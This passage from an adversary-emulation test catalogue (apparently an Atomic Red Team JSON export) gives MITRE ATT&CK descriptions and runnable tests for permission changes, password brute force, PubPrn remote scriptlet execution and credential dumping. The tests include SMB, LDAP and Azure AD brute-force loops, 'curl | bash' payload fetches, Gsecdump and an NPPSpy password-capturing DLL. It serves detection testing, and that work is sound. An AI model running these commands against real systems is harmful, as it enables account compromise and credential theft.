write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ", "atomic_tests": [{"name": "chmod - Change file or folder mode (numeric mode)", "auto_generated_guid": "34ca1464-de9d-40c6-8c77-690adf36a135", "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"numeric_mode": {"description": "Specified numeric mode value", "type": "integer", "default": 755}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002"}}, "executor": {"command": "chmod #{numeric_mode} #{file_or_folder}\n", "name": "sh"}}, {"name": "chmod - Change file or folder mode (symbolic mode)", "auto_generated_guid": "fc9d6695-d022-4a80-91b1-381f5c35aff3", "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"symbolic_mode": {"description": "Specified symbolic mode value", "type": "string", "default": "a+w"}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002"}}, "executor": {"command": "chmod #{symbolic_mode} #{file_or_folder}\n", "name": "sh"}}, {"name": "chmod - Change file or folder mode (numeric mode) recursively", "auto_generated_guid": "ea79f937-4a4d-4348-ace6-9916aec453a4", "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"numeric_mode": {"description": "Specified numeric mode value", "type": "integer", "default": 755}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002"}}, "executor": {"command": "chmod -R #{numeric_mode} #{file_or_folder}\n", "name": "sh"}}, {"name": "chmod - Change file or folder mode (symbolic mode) recursively", "auto_generated_guid": "0451125c-b5f6-488f-993b-5a32b09f7d8f", "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"symbolic_mode": {"description": "Specified symbolic mode value", "type": "string", "default": "a+w"}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002"}}, "executor": {"command": "chmod -R #{symbolic_mode} #{file_or_folder}\n", "name": "bash"}}, {"name": "chown - Change file or folder ownership and group", "auto_generated_guid": "d169e71b-85f9-44ec-8343-27093ff3dfc0", "description": "Changes a file or folder's ownership and group information using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"owner": {"description": "Username of desired owner", "type": "string", "default": "root"}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"}, "group": {"description": "Group name of desired group", "type": "string", "default": "root"}}, "executor": {"command": "chown #{owner}:#{group} #{file_or_folder}\n", "name": "bash"}}, {"name": "chown - Change file or folder ownership and group recursively", "auto_generated_guid": "b78598be-ff39-448f-a463-adbf2a5b7848", "description": "Changes a file or folder's ownership and group information recursively using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"owner": {"description": "Username of desired owner", "type": "string", "default": "root"}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002"}, "group": {"description": "Group name of desired group", "type": "string", "default": "root"}}, "executor": {"command": "chown -R #{owner}:#{group} #{file_or_folder}\n", "name": "bash"}}, {"name": "chown - Change file or folder mode ownership only", "auto_generated_guid": "967ba79d-f184-4e0e-8d09-6362b3162e99", "description": "Changes a file or folder's ownership only using chown.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"owner": {"description": "Username of desired owner", "type": "string", "default": "root"}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"}}, "executor": {"command": "chown #{owner} #{file_or_folder}\n", "name": "sh"}}, {"name": "chown - Change file or folder ownership recursively", "auto_generated_guid": "3b015515-b3d8-44e9-b8cd-6fa84faf30b2", "description": "Changes a file or folder's ownership only recursively using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"owner": {"description": "Username of desired owner", "type": "string", "default": "root"}, "file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222.002"}}, "executor": {"command": "chown -R #{owner} #{file_or_folder}\n", "name": "bash"}}, {"name": "chattr - Remove immutable file attribute", "auto_generated_guid": "e7469fe2-ad41-4382-8965-99b94dd3c13f", "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_modify": {"description": "Path of the file", "type": "path", "default": "/var/spool/cron/root"}}, "executor": {"command": "chattr -i #{file_to_modify}\n", "name": "sh"}}, {"name": "chflags - Remove immutable file attribute", "auto_generated_guid": "60eee3ea-2ebd-453b-a666-c52ce08d2709", "description": "Remove's a file's `immutable` attribute using `chflags`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["linux"], "input_arguments": {"file_to_modify": {"description": "Path of the file", "type": "path", "default": "/tmp/T1222.002.txt"}}, "executor": {"command": "touch #{file_to_modify}\nchflags simmutable #{file_to_modify}\nchflags nosimmutable #{file_to_modify}\n", "name": "sh"}}, {"name": "Chmod through c script", "auto_generated_guid": "973631cf-6680-4ffa-a053-045e1b6b67ab", "description": "chmods a file using a c script\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"source_file": {"description": "Path of c source file", "type": "path", "default": "PathToAtomicsFolder/T1222.002/src/T1222.002.c"}, "compiled_file": {"description": "Path of compiled file", "type": "path", "default": "/tmp/T1222002"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n", "prereq_command": "gcc #{source_file} -o #{compiled_file}\n", "get_prereq_command": "gcc #{source_file} -o #{compiled_file}\n"}], "executor": {"command": "#{compiled_file} /tmp/ T1222002\n", "name": "sh"}}, {"name": "Chmod through c script (freebsd)", "auto_generated_guid": "da40b5fe-3098-4b3b-a410-ff177e49ee2e", "description": "chmods a file using a c script\n", "supported_platforms": ["linux"], "input_arguments": {"source_file": {"description": "Path of c source file", "type": "path", "default": "PathToAtomicsFolder/T1222.002/src/T1222.002.c"}, "compiled_file": {"description": "Path of compiled file", "type": "path", "default": "/tmp/T1222002"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n", "prereq_command": "cc #{source_file} -o #{compiled_file}\n", "get_prereq_command": "cc #{source_file} -o #{compiled_file}\n"}], "executor": {"command": "#{compiled_file} /tmp/ T1222002\n", "name": "sh"}}, {"name": "Chown through c script", "auto_generated_guid": "18592ba1-5f88-4e3c-abc8-ab1c6042e389", "description": "chowns a file to root using a c script\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"source_file": {"description": "Path of c source file", "type": "path", "default": "PathToAtomicsFolder/T1222.002/src/chown.c"}, "compiled_file": {"description": "Path of compiled file", "type": "path", "default": "/tmp/T1222002own"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n", "prereq_command": "gcc #{source_file} -o #{compiled_file}\n", "get_prereq_command": "gcc #{source_file} -o #{compiled_file}\n"}], "executor": {"command": "sudo #{compiled_file} #{source_file}\n", "name": "sh", "elevation_required": true}}, {"name": "Chown through c script (freebsd)", "auto_generated_guid": "eb577a19-b730-4918-9b03-c5edcf51dc4e", "description": "chowns a file to root using a c script\n", "supported_platforms": ["linux"], "input_arguments": {"source_file": {"description": "Path of c source file", "type": "path", "default": "PathToAtomicsFolder/T1222.002/src/chown.c"}, "compiled_file": {"description": "Path of compiled file", "type": "path", "default": "/tmp/T1222002own"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n", "prereq_command": "cc #{source_file} -o #{compiled_file}\n", "get_prereq_command": "cc #{source_file} -o #{compiled_file}\n"}], "executor": {"command": "#{compiled_file} #{source_file}\n", "name": "sh", "elevation_required": true}}]}, "T1110.001": {"name": "Password Guessing", "technique_id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119", "external_id": "T1110.001", "data_components": ["Application Log Content", "User Account Authentication"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b", "course-of-action--f9f9e6ef-bc0a-41ad-ba11-0924e5e84c4c"], "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.", "atomic_tests": [{"name": "Brute Force Credentials of single Active Directory domain users via SMB", "auto_generated_guid": "09480053-2f98-4854-be6e-71ae5f672224", "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n", "supported_platforms": ["windows"], "input_arguments": {"user": {"description": "Account to bruteforce", "type": "string", "default": "%username%"}}, "executor": {"name": "command_prompt", "command": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL\n"}}, {"name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)", "auto_generated_guid": "c2969434-672b-4ec8-8df0-bbb91f40e250", "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n", "supported_platforms": ["windows"], "input_arguments": {"user": {"description": "Account to bruteforce", "type": "string", "default": "$ENV:USERNAME"}, "passwords_path": {"description": "List of passwords we will attempt to brute force with", "type": "path", "default": "PathToAtomicsFolder\\T1110.001\\src\\passwords.txt"}, "domain": {"description": "Active Directory domain FQDN", "type": "string", "default": "$env:UserDnsDomain"}, "auth": {"description": "authentication method to choose between \"NTLM\" and \"Kerberos\"", "type": "string", "default": "NTLM"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path \"#{passwords_path}\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n"}}, {"name": "Brute Force Credentials of single Azure AD user", "auto_generated_guid": "5a51ef57-299e-4d62-8e11-2d440df55e69", "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\"", "type": "string", "default": "bruce.wayne@contoso.com"}, "passwords": {"description": "List of passwords we will attempt to brute force with", "type": "string", "default": "Password1`n1q2w3e4r`nPassword!"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n"}}, {"name": "Password Brute User using Kerbrute Tool", "auto_generated_guid": "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4", "description": "Bruteforce a single user's password from a wordlist\n", "supported_platforms": ["windows"], "input_arguments": {"domaincontroller": {"description": "Domain controller where test will be run", "type": "string", "default": "$ENV:userdnsdomain"}, "domain": {"description": "Domain where you will be testing", "type": "string", "default": "$ENV:userdomain"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"}, {"description": "bruteuser.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1 \n"}}, {"name": "SUDO Brute Force - Debian", "auto_generated_guid": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700", "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Check if running on a Debian based machine.\n", "prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n", "get_prereq_command": "apt update && apt install -y openssl sudo curl\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n", "cleanup_command": "userdel -fr art\n"}}, {"name": "SUDO Brute Force - Redhat", "auto_generated_guid": "4097bc00-5eeb-4d56-aaf9-287d60351d95", "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Check if running on a Redhat based machine.\n", "prereq_command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n", "get_prereq_command": "yum update && yum install -y openssl sudo curl\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n", "cleanup_command": "userdel -fr art\n"}}, {"name": "SUDO Brute Force - FreeBSD", "auto_generated_guid": "abcde488-e083-4ee7-bc85-a5684edd7541", "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if running on a FreeBSD based machine.\n", "prereq_command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n", "get_prereq_command": "pkg update && pkg install -y sudo curl bash\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n", "cleanup_command": "rmuser -y art\n"}}]}, "T1216.001": {"name": "PubPrn", "technique_id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58", "external_id": "T1216.001", "data_components": ["Command Execution", "Script Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).", "atomic_tests": [{"name": "PubPrn.vbs Signed Script Bypass", "auto_generated_guid": "9dd29a1f-1e16-4862-be83-913b10a88f6c", "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_payload": {"description": "A remote payload to execute using PubPrn.vbs.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"}}, "executor": {"command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n", "name": "command_prompt"}}]}, "T1003": {"name": "OS Credential Dumping", "technique_id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22", "external_id": "T1003", "data_components": ["Windows Registry Key Access", "OS API Execution", "Active Directory Object Access", "Process Access", "Network Traffic Flow", "Command Execution", "File Access", "Process Creation", "Network Traffic Content"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--49c06d54-9002-491d-9147-8efb537fbd26", "course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n", "atomic_tests": [{"name": "Gsecdump", "auto_generated_guid": "96345bfc-8ae7-4b6a-80b7-223200f24ef9", "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n", "supported_platforms": ["windows"], "input_arguments": {"gsecdump_exe": {"description": "Path to the Gsecdump executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe"}, "gsecdump_bin_hash": {"description": "File hash of the Gsecdump binary file", "type": "string", "default": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC"}, "gsecdump_url": {"description": "Path to download Gsecdump binary file", "type": "url", "default": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n", "prereq_command": "if (Test-Path \"#{gsecdump_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n"}], "executor": {"command": "\"#{gsecdump_exe}\" -a\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Credential Dumping with NPPSpy", "auto_generated_guid": "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6", "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "NPPSpy.dll must be available in ExternalPayloads directory", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\") {exit 0} else {exit 1}", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\""}], "executor": {"command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in 